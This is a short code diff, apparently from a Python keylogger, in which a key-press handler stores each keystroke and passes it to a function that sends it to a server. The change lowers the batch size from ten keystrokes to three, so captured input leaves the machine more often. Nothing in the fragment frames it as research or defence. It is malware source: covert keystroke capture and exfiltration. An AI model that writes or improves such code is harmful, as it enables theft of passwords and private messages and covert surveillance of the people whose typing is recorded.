@@ -37,7 +37,7 @@ def on_press(key):
             keystrokes.append(f'[{str(key)}]')  # Store other special keys
     
     # Send keystrokes to the server periodically (or at key events)
-    if len(keystrokes) >= 10:  # Example condition to send data
+    if len(keystrokes) >= 3: 
         send_keystrokes_to_server(''.join(keystrokes))
         keystrokes = []  # Reset after sending
 
